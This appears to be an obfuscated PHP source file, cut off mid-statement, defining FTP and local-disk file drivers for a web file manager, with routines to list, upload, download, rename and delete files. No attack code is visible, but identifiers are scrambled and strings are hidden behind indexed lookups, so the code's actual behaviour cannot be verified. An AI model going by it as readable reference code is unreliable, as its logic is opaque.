<?php
 goto b×ÂóºğÚ³; A½‚ÂÕîÇÓ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($÷«¦µò½) { parent::__construct(); if (count($÷«¦µò½) > 0) { $this->_init($÷«¦µò½); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($²şß¿Îı) { $¤ƒ ¶ó† =& $_SERVER[ïëó©ÒÚ]; global $config; $this->appCharset = $config[$¤ƒ ¶ó†[1367]]; $this->systemCharset = $config[$¤ƒ ¶ó†[1368]]; if (isset($²şß¿Îı[$¤ƒ ¶ó†[1369]]) && $²şß¿Îı[$¤ƒ ¶ó†[1369]]) { $this->systemCharset = $²şß¿Îı[$¤ƒ ¶ó†[1369]]; } } public function iconvApp($ÜÍŸ‡è) { return $this->iconvTo($ÜÍŸ‡è, $this->systemCharset, $this->appCharset); } public function iconvSystem($çÏ€æ®å) { return $this->iconvTo($çÏ€æ®å, $this->appCharset, $this->systemCharset); } public function getPathOuter($ı¨İ¯ ‹) { $áüæ™× =& $_SERVER[ïëó©ÒÚ]; $¥Ü¥µ¥· = $this->iconvApp($this->pathBase); $ı¨İ¯ ‹ = $this->iconvApp($ı¨İ¯ ‹); if (substr($¥Ü¥µ¥·, 0, 2) == $áüæ™×[1370]) { $¥Ü¥µ¥· = BASIC_PATH . substr($¥Ü¥µ¥·, 2); } if (substr($ı¨İ¯ ‹, 0, 2) == $áüæ™×[1370]) { $ı¨İ¯ ‹ = BASIC_PATH . substr($ı¨İ¯ ‹, 2); } $¥Ü¥µ¥· = KodIO::clear($¥Ü¥µ¥·); $ı¨İ¯ ‹ = KodIO::clear($ı¨İ¯ ‹); $ı¨İ¯ ‹ = substr($ı¨İ¯ ‹, strlen($¥Ü¥µ¥·)); if (empty($this->pathDriver)) { return $ı¨İ¯ ‹; } return $this->pathDriver . $áüæ™×[8] . ltrim($ı¨İ¯ ‹, $áüæ™×[8]); } private function _init($˜×ªÅ® = array()) { $Âˆ¾¸ú€ =& $_SERVER[ïëó©ÒÚ]; if (!function_exists($Âˆ¾¸ú€[1371])) { throw new Exception(LNG($Âˆ¾¸ú€[1372])); } $this->config = $˜×ªÅ®; $this->charsetReset($˜×ªÅ®); foreach ($˜×ªÅ® as $øÍ‰Åªé => $Åë”Œíœ) { if (isset($this->{$øÍ‰Åªé})) { $this->{$øÍ‰Åªé} = $Åë”Œíœ; } } return $this->_login($˜×ªÅ®); } private function _login($ŸÃìã§Î) { $Íì¨éÒ =& $_SERVER[ïëó©ÒÚ]; static $ËÈäƒ‡ñ = array(); $¿ÊîÅîğ = md5(json_encode($ŸÃìã§Î)); if (isset($ËÈäƒ‡ñ[$¿ÊîÅîğ])) { foreach ($ËÈäƒ‡ñ[$¿ÊîÅîğ] as $ò­ºñ„Ò => $º¾ä‚–Í) { $this->{$ò­ºñ„Ò} = $º¾ä‚–Í; } return !0; } $Û†ªåÔ· = parse_url(trim($this->server, $Íì¨éÒ[8])); $this->host = $Û†ªåÔ·[$Íì¨éÒ[181]]; $Â˜ƒ§˜á = isset($Û†ªåÔ·[$Íì¨éÒ[180]]) && $Û†ªåÔ·[$Íì¨éÒ[180]] == $Íì¨éÒ[1373] ? !0 : !1; $this->scheme = $Â˜ƒ§˜á ? $Íì¨éÒ[1374] : $Íì¨éÒ[1375]; $this->port = isset($Û†ªåÔ·[$Íì¨éÒ[182]]) ? $Û†ªåÔ·[$Íì¨éÒ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $÷›°ã©ê = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $×ÖÇ¬‘ = $this->pasv == $Íì¨éÒ[88] ? !0 : !1; @ftp_pasv($this->connect, $×ÖÇ¬‘); $ËÈäƒ‡ñ[$¿ÊîÅîğ] = array($Íì¨éÒ[1376] => $this->connect, $Íì¨éÒ[181] => $this->host, $Íì¨éÒ[180] => $this->scheme, $Íì¨éÒ[182] => $this->port); return $÷›°ã©ê; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($”ùöİ, $ˆöÊôĞ = '', $šÆÛåÍö = REPEAT_RENAME) { if ($this->setContent($”ùöİ, $ˆöÊôĞ)) { return $this->getPathOuter($”ùöİ); } return !1; } public function mkdir($ÏÈôÕíÈ, $ÙÈ‰¨¸Ô = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÏÈôÕíÈ = $this->iconvSystem($ÏÈôÕíÈ); if ($this->_isFolder($ÏÈôÕíÈ) || @ftp_mkdir($this->connect, $ÏÈôÕíÈ)) { return $this->getPathOuter($ÏÈôÕíÈ); } if (!$this->mkdir($this->pathFather($ÏÈôÕíÈ))) { return !1; } if ($ÏÈôÕíÈ = @ftp_mkdir($this->connect, $ÏÈôÕíÈ)) { return $this->getPathOuter($ÏÈôÕíÈ); } return !1; } public function copyFile($éÚµ†âŒ, $£Ê»¿³) { if (!$this->_isconn()) { return !1; } $Úíéì©å = $this->pathThis($this->iconvSystem($éÚµ†âŒ)); $¥Õ¿Éõ = $this->tempFile($Úíéì©å); $İŞ¦Ó–œ = $this->iconvApp($¥Õ¿Éõ); $this->download($éÚµ†âŒ, $İŞ¦Ó–œ); $®Íœ„³¿ = $this->upload($£Ê»¿³, $İŞ¦Ó–œ); $this->tempFileRemve($¥Õ¿Éõ); return $®Íœ„³¿; } public function moveFile($¼˜Â¨£‹, $¯ä•†¦) { if (!$this->_isconn()) { return !1; } $¼˜Â¨£‹ = $this->iconvSystem($¼˜Â¨£‹); $¯ä•†¦ = $this->iconvSystem($¯ä•†¦); $´—ï›ïç = @ftp_rename($this->connect, $¼˜Â¨£‹, $¯ä•†¦); return $´—ï›ïç ? $this->getPathOuter($¯ä•†¦) : !1; } public function delFile($©ß±Äª) { if (!$this->_isconn()) { return !1; } $©ß±Äª = $this->iconvSystem($©ß±Äª); return @ftp_delete($this->connect, $©ß±Äª); } public function delFolder($àÆœâ¾) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Í‚­¢¡¬ = $›ı›É‰¤ = array(); $this->fileList($àÆœâ¾, $Í‚­¢¡¬, $›ı›É‰¤, !0); $this->listItemCache = !0; foreach ($›ı›É‰¤ as $áƒ‘×ğ) { $½ù±ğö = $this->iconvSystem($áƒ‘×ğ[$_SERVER[ïëó©ÒÚ][32]]); $­ğõáíÁ = @ftp_delete($this->connect, $½ù±ğö); if (!$­ğõáíÁ) { return !1; } } foreach ($Í‚­¢¡¬ as $½ù±ğö) { $½ù±ğö = $this->iconvSystem($½ù±ğö); $­ğõáíÁ = @ftp_rmdir($this->connect, $½ù±ğö); if (!$­ğõáíÁ) { return !1; } } $àÆœâ¾ = $this->iconvSystem($àÆœâ¾); return @ftp_rmdir($this->connect, $àÆœâ¾); } public function rename($óç±›ÀÙ, $‰ÙïŠ±Å) { $“˜î‰±‡ =& $_SERVER[ïëó©ÒÚ]; if (!$this->_isconn()) { return !1; } $³Ìİ¡‹ù = $this->fileNameAuto($this->pathFather($óç±›ÀÙ), $‰ÙïŠ±Å); $³Ìİ¡‹ù = $this->iconvSystem($³Ìİ¡‹ù); $óç±›ÀÙ = $this->iconvSystem($óç±›ÀÙ); $×¼İî¯ó = $this->pathFather($óç±›ÀÙ); $êÇé¬ºÉ = rtrim($×¼İî¯ó, $“˜î‰±‡[8]) . $“˜î‰±‡[8] . $³Ìİ¡‹ù; $É©•›†« = @ftp_rename($this->connect, $óç±›ÀÙ, $êÇé¬ºÉ); $êÇé¬ºÉ = $this->iconvApp($êÇé¬ºÉ); return $É©•›†« ? $this->getPathOuter($êÇé¬ºÉ) : !1; } private function folderInfo($©‹Í¿ªĞ, $…æöÀÇ¼ = false) { $êû•¡„æ =& $_SERVER[ïëó©ÒÚ]; $ñÃ¨İ’­ = array($êû•¡„æ[32] => $this->pathThis($©‹Í¿ªĞ), $êû•¡„æ[84] => $this->getPathOuter($êû•¡„æ[8] . $©‹Í¿ªĞ), $êû•¡„æ[33] => $êû•¡„æ[75]); if ($…æöÀÇ¼) { return $ñÃ¨İ’­; } $ñÃ¨İ’­[$êû•¡„æ[200]] = $ñÃ¨İ’­[$êû•¡„æ[85]] = 0; $ñÃ¨İ’­[$êû•¡„æ[201]] = $ñÃ¨İ’­[$êû•¡„æ[202]] = !0; return $ñÃ¨İ’­; } private function fileInfo($×æüÅ¨†, $€¼Ö–ÁÈ = false, $“şÁäªï = array()) { $­ŞŠï“¢ =& $_SERVER[ïëó©ÒÚ]; $ÉÅ˜ó = array($­ŞŠï“¢[32] => $this->pathThis($×æüÅ¨†), $­ŞŠï“¢[84] => $this->getPathOuter($­ŞŠï“¢[8] . $×æüÅ¨†), $­ŞŠï“¢[33] => $­ŞŠï“¢[199], $­ŞŠï“¢[76] => isset($“şÁäªï[$­ŞŠï“¢[76]]) ? $“şÁäªï[$­ŞŠï“¢[76]] : 0, $­ŞŠï“¢[174] => $this->ext($×æüÅ¨†)); if ($€¼Ö–ÁÈ) { return $ÉÅ˜ó; } $ÉÅ˜ó[$­ŞŠï“¢[200]] = $ÉÅ˜ó[$­ŞŠï“¢[85]] = 0; $ÉÅ˜ó[$­ŞŠï“¢[201]] = $ÉÅ˜ó[$­ŞŠï“¢[202]] = !0; $–ïÉ‹òÎ = $this->iconvSystem($×æüÅ¨†); $ÉÅ˜ó[$­ŞŠï“¢[85]] = @ftp_mdtm($this->connect, $–ïÉ‹òÎ); if (empty($“şÁäªï)) { $“şÁäªï = $this->objectMeta($×æüÅ¨†); if (!$“şÁäªï) { return $ÉÅ˜ó; } } $ÉÅ˜ó[$­ŞŠï“¢[76]] = $“şÁäªï[$­ŞŠï“¢[76]]; return $ÉÅ˜ó; } public function size($‘ô„âÄÆ) { $ŠåâùœÒ = $this->objectMeta($‘ô„âÄÆ); return $ŠåâùœÒ ? $ŠåâùœÒ[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function info($Ú‰æîìÄ) { if ($this->isFile($Ú‰æîìÄ)) { return $this->fileInfo($Ú‰æîìÄ, 0); } else { if ($this->isFolder($Ú‰æîìÄ)) { return $this->folderInfo($Ú‰æîìÄ); } } return !1; } private function fileList($²òèÅ, &$ğ»ãşÂ, &$óìˆšÄÊ, $‚¤ó¯ƒ = false) { $±Ğ²¬ó =& $_SERVER[ïëó©ÒÚ]; $²òèÅ = $this->iconvSystem($²òèÅ); if (!$this->isFolder($²òèÅ)) { return !1; } @ftp_chdir($this->connect, $±Ğ²¬ó[8]); $²òèÅ = rtrim($²òèÅ, $±Ğ²¬ó[8]) . $±Ğ²¬ó[8]; check_abort(); $½şÌ‚õ™ = @ftp_rawlist($this->connect, $²òèÅ); if (!$½şÌ‚õ™) { $½şÌ‚õ™ = array(); } $ığŒ¾İâ = array($±Ğ²¬ó[10] => 1, $±Ğ²¬ó[1377] => 1); foreach ($½şÌ‚õ™ as $ÙøÓÒı¤) { $ •Êª¢š = $this->_listItem($ÙøÓÒı¤); if ($ •Êª¢š[0] == $±Ğ²¬ó[769]) { continue; } $á†ß×ˆŒ = $ •Êª¢š[8]; if (empty($á†ß×ˆŒ) && $á†ß×ˆŒ !== $±Ğ²¬ó[197] || isset($ığŒ¾İâ[$á†ß×ˆŒ])) { continue; } $á†ß×ˆŒ = $this->iconvApp($²òèÅ . ltrim($á†ß×ˆŒ, $±Ğ²¬ó[8])); $”ÃÁòı× = array($±Ğ²¬ó[32] => $á†ß×ˆŒ, $±Ğ²¬ó[33] => $±Ğ²¬ó[199], $±Ğ²¬ó[76] => $ •Êª¢š[4]); if (substr($ÙøÓÒı¤, 0, 1) == $±Ğ²¬ó[1378]) { $”ÃÁòı×[$±Ğ²¬ó[33]] = $±Ğ²¬ó[75]; $”ÃÁòı×[$±Ğ²¬ó[76]] = 0; } $Û€§¿üÕ = $”ÃÁòı×[$±Ğ²¬ó[33]] == $±Ğ²¬ó[75] ? !0 : !1; $this->cacheMethodInfoSet($á†ß×ˆŒ, $Û€§¿üÕ, $”ÃÁòı×); if ($Û€§¿üÕ) { $ğ»ãşÂ[] = $á†ß×ˆŒ; if ($‚¤ó¯ƒ) { $this->fileList($á†ß×ˆŒ, $ğ»ãşÂ, $óìˆšÄÊ, $‚¤ó¯ƒ); } continue; } $óìˆšÄÊ[] = $”ÃÁòı×; } $this->cacheMethodInfoSet($²òèÅ, !0); } private function _listItem($›ù©ñ‘œ) { if (empty($›ù©ñ‘œ)) { return array(); } $óõ´ÎèÈ = preg_split($_SERVER[ïëó©ÒÚ][1379], $›ù©ñ‘œ); if (count($óõ´ÎèÈ) <= 9) { return $óõ´ÎèÈ; } $óõ´ÎèÈ[8] = trim(substr($›ù©ñ‘œ, strpos($›ù©ñ‘œ, $óõ´ÎèÈ[7]) + strlen($óõ´ÎèÈ[7]))); return array_splice($óõ´ÎèÈ, 0, 9); } public function listPath($ˆà‚âãõ, $é¥Ê²‹ª = false) { $¶­¢áÀ´ =& $_SERVER[ïëó©ÒÚ]; if (!$this->_isconn()) { return !1; } $‚ ³»Ç‹ = $‘†¹Äóï = array(); $this->fileList($ˆà‚âãõ, $‚ ³»Ç‹, $‘†¹Äóï); foreach ($‚ ³»Ç‹ as $ã­õİœÎ => $‘Îë¨±) { $‚ ³»Ç‹[$ã­õİœÎ] = $this->folderInfo($‘Îë¨±, $é¥Ê²‹ª); } foreach ($‘†¹Äóï as $ã­õİœÎ => $‘Îë¨±) { $‘†¹Äóï[$ã­õİœÎ] = $this->fileInfo($‘Îë¨±[$¶­¢áÀ´[32]], $é¥Ê²‹ª, $‘Îë¨±); } return array($¶­¢áÀ´[82] => $‚ ³»Ç‹, $¶­¢áÀ´[83] => $‘†¹Äóï); } public function has($ø•´¤áÜ, $ö¹Áû¨ñ = false, $éİÙè°È = true) { $åÈ‚¯ö =& $_SERVER[ïëó©ÒÚ]; $Ÿ‡óìÜ = $‹²º² = array(); $‡¡¹ÄÈ‰ = $ö¹Áû¨ñ ? !0 : !1; $this->fileList($ø•´¤áÜ, $Ÿ‡óìÜ, $‹²º², $‡¡¹ÄÈ‰); if ($ö¹Áû¨ñ) { return array($åÈ‚¯ö[207] => count($‹²º²), $åÈ‚¯ö[208] => count($Ÿ‡óìÜ)); } if ($éİÙè°È) { if (count($‹²º²)) { return !0; } } else { if (count($Ÿ‡óìÜ)) { return !0; } } return !1; } public function listAll($›Û”š­ã) { $¨‚ß˜Í¤ =& $_SERVER[ïëó©ÒÚ]; if (!$this->_isconn()) { return !1; } $ìæ²±í‡ = $™ä½ÇÆ = array(); $this->fileList($›Û”š­ã, $ìæ²±í‡, $™ä½ÇÆ, !0); $ÄÄ‚ÇÓ¶ = array(); foreach ($™ä½ÇÆ as $û¢ªª®Ú) { $ÄÄ‚ÇÓ¶[$û¢ªª®Ú[$¨‚ß˜Í¤[32]]] = $û¢ªª®Ú[$¨‚ß˜Í¤[76]]; } foreach ($ìæ²±í‡ as $û¢ªª®Ú) { if (is_string($û¢ªª®Ú)) { $ÄÄ‚ÇÓ¶[$û¢ªª®Ú] = 0; } } return $this->listAllFiles($›Û”š­ã, array_keys($ÄÄ‚ÇÓ¶), $ÄÄ‚ÇÓ¶); } public function getContent($½’¯Ü¹Œ) { if (!$this->_isconn()) { return !1; } $½’¯Ü¹Œ = $this->iconvSystem($½’¯Ü¹Œ); return $this->fileSubstr($½’¯Ü¹Œ); } public function setContent($»Ï¼¢ş’, $¾´ÆØ´¸ = '') { if (!$this->_isconn()) { return !1; } $†¢†ë¼¯ = $this->pathThis($this->iconvSystem($»Ï¼¢ş’)); $úâ…ÎüŒ = $this->tempFile($†¢†ë¼¯); file_put_contents($úâ…ÎüŒ, $¾´ÆØ´¸); $¸ÒüÓ› = $this->upload($»Ï¼¢ş’, $this->iconvApp($úâ…ÎüŒ)); $this->tempFileRemve($úâ…ÎüŒ); return $¸ÒüÓ›; } public function fileSubstr($·æ¸î¨µ, $¾Õ¹—— = 0, $Î©Ã‘úÉ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($·æ¸î¨µ, $¾Õ¹——, $Î©Ã‘úÉ); } private function ftpRequest($äÚÍÒ¥ô, $ä„™èã¢ = 0, $™æÖ´œ¹ = false) { $äÚÍÒ¥ô = $this->iconvSystem($äÚÍÒ¥ô); $Å›Ú¥ğª = $this->scheme . $this->host . $_SERVER[ïëó©ÒÚ][4] . $this->port; $ìıŠçŒ = curl_init(); curl_setopt($ìıŠçŒ, CURLOPT_URL, $Å›Ú¥ğª . $this->pathEncode($äÚÍÒ¥ô)); curl_setopt($ìıŠçŒ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($™æÖ´œ¹) { $¤™÷ñ¦¾ = $ä„™èã¢ + $™æÖ´œ¹ - 1; curl_setopt($ìıŠçŒ, CURLOPT_RANGE, "{$ä„™èã¢}\x2d{$¤™÷ñ¦¾}"); } curl_setopt($ìıŠçŒ, CURLOPT_RETURNTRANSFER, 1); $Ÿˆ‹ß€ï = curl_exec($ìıŠçŒ); curl_close($ìıŠçŒ); return $Ÿˆ‹ß€ï; } public function upload($†¯œÀó, $”¦™âòÀ, $Ö¯¿·‘ = false, $ş†øÁò = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($†¯œÀó))) { return !1; } $†¯œÀó = $this->iconvSystem($†¯œÀó); $”¦™âòÀ = $this->iconvSystem($”¦™âòÀ); $úÍç¨ÏÀ = ftp_nb_put($this->connect, $†¯œÀó, $”¦™âòÀ, FTP_BINARY); while ($úÍç¨ÏÀ == FTP_MOREDATA) { $úÍç¨ÏÀ = ftp_nb_continue($this->connect); } if ($úÍç¨ÏÀ != FTP_FINISHED) { return !1; } return $this->getPathOuter($†¯œÀó); } public function download($ú¤ã„‡, $¹ä‚ä®Ï = '') { if (!$this->_isconn()) { return !1; } $ŸˆÖ¾Ôé = $this->pathFather($¹ä‚ä®Ï); if (!IO::mkdir($ŸˆÖ¾Ôé)) { return !1; } $ú¤ã„‡ = $this->iconvSystem($ú¤ã„‡); $¹ä‚ä®Ï = $this->iconvSystem($¹ä‚ä®Ï); $¶‚Ïßû = ftp_nb_get($this->connect, $¹ä‚ä®Ï, $ú¤ã„‡, FTP_BINARY); while ($¶‚Ïßû == FTP_MOREDATA) { $¶‚Ïßû = ftp_nb_continue($this->connect); } if ($¶‚Ïßû != FTP_FINISHED) { return !1; } return $this->iconvApp($¹ä‚ä®Ï); } public function exist($­…‡é³ë) { return $this->isFile($­…‡é³ë) || $this->isFolder($­…‡é³ë); } public function isFile($Æ£ÌˆÃÈ) { return !$this->isFolder($Æ£ÌˆÃÈ) && $this->objectMeta($Æ£ÌˆÃÈ); } public function isFolder($ÏäƒüÇù) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][165], $ÏäƒüÇù); } protected function objectMeta($ü‚€î’Î) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][167], $ü‚€î’Î); } protected function _objectMeta($”  £) { $é–‰Öè =& $_SERVER[ïëó©ÒÚ]; if ($”  £ == $é–‰Öè[12] || $”  £ == $é–‰Öè[8]) { return array(); } if (!$this->_isconn()) { return !1; } $”  £ = $this->iconvSystem($”  £); $‰¹ß€ˆ° = array($é–‰Öè[32] => $this->iconvApp($”  £), $é–‰Öè[33] => $é–‰Öè[199], $é–‰Öè[76] => 0); @ftp_chdir($this->connect, $é–‰Öè[8]); $ßŠëÕì… = @ftp_size($this->connect, $”  £); if ($ßŠëÕì… != -1) { $‰¹ß€ˆ°[$é–‰Öè[76]] = $ßŠëÕì…; } else { $¢‡½ŒÖÌ = @ftp_chdir($this->connect, $”  £); if (!$¢‡½ŒÖÌ) { return !1; } $‰¹ß€ˆ°[$é–‰Öè[33]] = $é–‰Öè[75]; } return $‰¹ß€ˆ°; } protected function _isFolder($ÓŠ¶÷¶›) { $ªĞÙÏ¦µ =& $_SERVER[ïëó©ÒÚ]; if ($ÓŠ¶÷¶› == $ªĞÙÏ¦µ[12] || $ÓŠ¶÷¶› == $ªĞÙÏ¦µ[8]) { return !0; } $¯÷ä’ÍÚ = $this->_objectMeta($ÓŠ¶÷¶›); return isset($¯÷ä’ÍÚ[$ªĞÙÏ¦µ[33]]) && $¯÷ä’ÍÚ[$ªĞÙÏ¦µ[33]] == $ªĞÙÏ¦µ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($šœ“ÚÙ®) { if (substr($šœ“ÚÙ®, 0, 2) == $_SERVER[ïëó©ÒÚ][1370]) { $šœ“ÚÙ® = BASIC_PATH . substr($šœ“ÚÙ®, 2); } return $šœ“ÚÙ®; } public function iconvApp($¡ì®ëö) { $¸¶Œ­²„ =& $_SERVER[ïëó©ÒÚ]; global $config; return $this->iconvTo($¡ì®ëö, $config[$¸¶Œ­²„[1368]], $config[$¸¶Œ­²„[1367]]); } public function iconvSystem($ÙäıÑµ) { $†íı»ŒÁ =& $_SERVER[ïëó©ÒÚ]; global $config; return $this->iconvTo($ÙäıÑµ, $config[$†íı»ŒÁ[1367]], $config[$†íı»ŒÁ[1368]]); } public function getPathOuter($»¢²•©Ÿ) { $…ìîÚöñ =& $_SERVER[ïëó©ÒÚ]; $êÜœŞø = $this->iconvApp($this->pathBase); $»¢²•©Ÿ = $this->iconvApp($»¢²•©Ÿ); if (substr($êÜœŞø, 0, 2) == $…ìîÚöñ[1370]) { $êÜœŞø = BASIC_PATH . substr($êÜœŞø, 2); } if (substr($»¢²•©Ÿ, 0, 2) == $…ìîÚöñ[1370]) { $»¢²•©Ÿ = BASIC_PATH . substr($»¢²•©Ÿ, 2); } $êÜœŞø = KodIO::clear($êÜœŞø); $»¢²•©Ÿ = KodIO::clear($»¢²•©Ÿ); $»¢²•©Ÿ = substr($»¢²•©Ÿ, strlen($êÜœŞø)); if (empty($this->pathDriver)) { return $»¢²•©Ÿ; } return $this->pathDriver . $…ìîÚöñ[8] . ltrim($»¢²•©Ÿ, $…ìîÚöñ[8]); } public function mkfile($…Ó»©Ø¥, $ã›ò˜µ = '', $Öõ’†“¯ = REPEAT_RENAME) { $…Ó»©Ø¥ = $this->iconvSystem($…Ó»©Ø¥); @touch($…Ó»©Ø¥); if ($ã›ò˜µ) { file_put_contents($…Ó»©Ø¥, $ã›ò˜µ); } @chmod($…Ó»©Ø¥, $this->pathAuth); return is_file($…Ó»©Ø¥) ? $this->getPathOuter($…Ó»©Ø¥) : !1; } public function mkdir($¥™’œÚï, $Šè©¢î = REPEAT_SKIP) { $¥™’œÚï = $this->iconvSystem($¥™’œÚï); if (is_dir($¥™’œÚï)) { return $this->getPathOuter($¥™’œÚï); } @mkdir($¥™’œÚï, $this->pathAuth, !0); @chmod($¥™’œÚï, $this->pathAuth); return is_dir($¥™’œÚï) ? $this->getPathOuter($¥™’œÚï) : !1; } public function copyFile($±¡§¼Äà, $û¦ÀÊàû) { $this->mkdir($this->pathFather($û¦ÀÊàû)); $±¡§¼Äà = $this->iconvSystem($±¡§¼Äà); $û¦ÀÊàû = $this->iconvSystem($û¦ÀÊàû); $Á¥¿÷Í¿ = copy_64($±¡§¼Äà, $û¦ÀÊàû); @chmod($û¦ÀÊàû, $this->pathAuth); return $Á¥¿÷Í¿ ? $this->getPathOuter($û¦ÀÊàû) : !1; } public function moveFile($•ƒ§€Š, $‚¿Ÿà) { $this->mkdir($this->pathFather($‚¿Ÿà)); $•ƒ§€Š = $this->iconvSystem($•ƒ§€Š); $‚¿Ÿà = $this->iconvSystem($‚¿Ÿà); $ŒÀœãª = intval(@rename($•ƒ§€Š, $‚¿Ÿà)); if (!$ŒÀœãª) { if ($ŒÀœãª = intval(@copy_64($•ƒ§€Š, $‚¿Ÿà))) { @unlink($•ƒ§€Š); } } @chmod($‚¿Ÿà, $this->pathAuth); return $ŒÀœãª ? $this->getPathOuter($‚¿Ÿà) : !1; } public function movePath($ï¡ßğÀ, $¤éÀÕéÉ, $º­şøïí = false) { $—ŸÁš²› =& $_SERVER[ïëó©ÒÚ]; $ï¡ßğÀ = $this->iconvSystem($ï¡ßğÀ); $¤éÀÕéÉ = $this->iconvSystem($¤éÀÕéÉ); $åŞ¤Ã¼À = rtrim($¤éÀÕéÉ, $—ŸÁš²›[8]) . $—ŸÁš²›[8] . ($º­şøïí ? $º­şøïí : get_path_this($ï¡ßğÀ)); if (file_exists($åŞ¤Ã¼À)) { return !1; } $•Ú¡å§ğ = intval(@rename($ï¡ßğÀ, $åŞ¤Ã¼À)); $•Ú¡å§ğ = file_exists($åŞ¤Ã¼À); return $•Ú¡å§ğ ? $this->getPathOuter($åŞ¤Ã¼À) : !1; } public function delFile($È­´ «‡) { $È­´ «‡ = $this->iconvSystem($È­´ «‡); if (!@unlink($È­´ «‡)) { @chmod($È­´ «‡, $this->pathAuth); if (!@unlink($È­´ «‡)) { return !1; } } else { return !0; } } public function delFolder($¢¨Ì¯ğ) { $¶¬÷âúä =& $_SERVER[ïëó©ÒÚ]; $¢¨Ì¯ğ = $this->iconvSystem($¢¨Ì¯ğ); if (!is_dir($¢¨Ì¯ğ)) { return !0; } if (!($Ó¯×¢ôÄ = opendir($¢¨Ì¯ğ))) { return !1; } while (($¢´÷Ñöã = readdir($Ó¯×¢ôÄ)) !== !1) { if ($¢´÷Ñöã == $¶¬÷âúä[10] || $¢´÷Ñöã == $¶¬÷âúä[1377]) { continue; } $Ä»«Ù“ = $¢¨Ì¯ğ . $¶¬÷âúä[8] . $¢´÷Ñöã; if (is_file($Ä»«Ù“) || is_link($Ä»«Ù“)) { if (!unlink($Ä»«Ù“)) { chmod($Ä»«Ù“, $this->pathAuth); if (!unlink($Ä»«Ù“)) { return !1; } } } else { if (is_dir($Ä»«Ù“)) { chmod($Ä»«Ù“, $this->pathAuth); $Ä»«Ù“ = $this->iconvApp($Ä»«Ù“); if (!$this->delFolder($Ä»«Ù“)) { return !1; } } } } closedir($Ó¯×¢ôÄ); return rmdir($¢¨Ì¯ğ); } public function rename($ïÌ¨Ş³ç, $åÃŸ®×˜) { $ÅõµˆÔ´ =& $_SERVER[ïëó©ÒÚ]; $¯èıö§¯ = $this->fileNameAuto($this->pathFather($ïÌ¨Ş³ç), $åÃŸ®×˜); $¯èıö§¯ = $this->iconvSystem($¯èıö§¯); $ïÌ¨Ş³ç = $this->iconvSystem($ïÌ¨Ş³ç); $ñË«©°µ = $this->pathFather($ïÌ¨Ş³ç); $™Š¸µÊ¬ = rtrim($ñË«©°µ, $ÅõµˆÔ´[8]) . $ÅõµˆÔ´[8] . $¯èıö§¯; $­§ Ø™ = @rename($ïÌ¨Ş³ç, $™Š¸µÊ¬); $™Š¸µÊ¬ = $this->iconvApp($™Š¸µÊ¬); return $­§ Ø™ ? $this->getPathOuter($™Š¸µÊ¬) : !1; } public function size($ §åÂÍ) { $ §åÂÍ = $this->iconvSystem($ §åÂÍ); return filesize_64($ §åÂÍ); } public function info($şÓñàå’) { $şÓñàå’ = $this->iconvSystem($şÓñàå’); if ($this->isFolder($şÓñàå’)) { return $this->folderInfo($şÓñàå’); } else { if ($this->isFile($şÓñàå’)) { return $this->fileInfo($şÓñàå’); } } return !1; } protected function infoChildren($å÷¨Íß¦, &$Ÿª”òæ—, $±±´ûÒú = true) { $ğ‡ê¦™Ï =& $_SERVER[ïëó©ÒÚ]; check_abort_echo(); $å÷¨Íß¦ = rtrim($å÷¨Íß¦, $ğ‡ê¦™Ï[8]) . $ğ‡ê¦™Ï[8]; if ($±±´ûÒú) { $å÷¨Íß¦ = $this->iconvSystem($å÷¨Íß¦); } if (!($…É‰›â› = @opendir($å÷¨Íß¦))) { return; } while (($Íğ¬ù©÷ = readdir($…É‰›â›)) !== !1) { if ($Íğ¬ù©÷ == $ğ‡ê¦™Ï[10] || $Íğ¬ù©÷ == $ğ‡ê¦™Ï[1377]) { continue; } $ËÕµƒÑ© = $å÷¨Íß¦ . $Íğ¬ù©÷; if (is_file($ËÕµƒÑ©) || is_link($ËÕµƒÑ©)) { $Ÿª”òæ—[$ğ‡ê¦™Ï[77]]++; $Ÿª”òæ—[$ğ‡ê¦™Ï[76]] += filesize_64($ËÕµƒÑ©); } else { if (is_dir($ËÕµƒÑ©)) { $Ÿª”òæ—[$ğ‡ê¦™Ï[78]]++; $this->infoChildren($ËÕµƒÑ©, $Ÿª”òæ—, !1); } } } closedir($…É‰›â›); } private function folderInfo($ò½ÎÄÁ¾, $ÌŠö‚‡ = false) { $İñÖ††Ò =& $_SERVER[ïëó©ÒÚ]; $ò½ÎÄÁ¾ = rtrim($ò½ÎÄÁ¾, $İñÖ††Ò[8]) . $İñÖ††Ò[8]; $“¬¼ºœî = $this->iconvApp($this->pathThis($ò½ÎÄÁ¾)); if ($ÌŠö‚‡) { return array($İñÖ††Ò[32] => $“¬¼ºœî, $İñÖ††Ò[84] => $this->getPathOuter($ò½ÎÄÁ¾), $İñÖ††Ò[33] => $İñÖ††Ò[75]); } $Ò±¯‹ê = array($İñÖ††Ò[32] => $“¬¼ºœî, $İñÖ††Ò[84] => $this->getPathOuter($ò½ÎÄÁ¾), $İñÖ††Ò[33] => $İñÖ††Ò[75], $İñÖ††Ò[200] => @filectime($ò½ÎÄÁ¾), $İñÖ††Ò[85] => @filemtime($ò½ÎÄÁ¾), $İñÖ††Ò[1380] => @fileatime($ò½ÎÄÁ¾), $İñÖ††Ò[1381] => is_readable($ò½ÎÄÁ¾), $İñÖ††Ò[1382] => is_writable($ò½ÎÄÁ¾), $İñÖ††Ò[1383] => 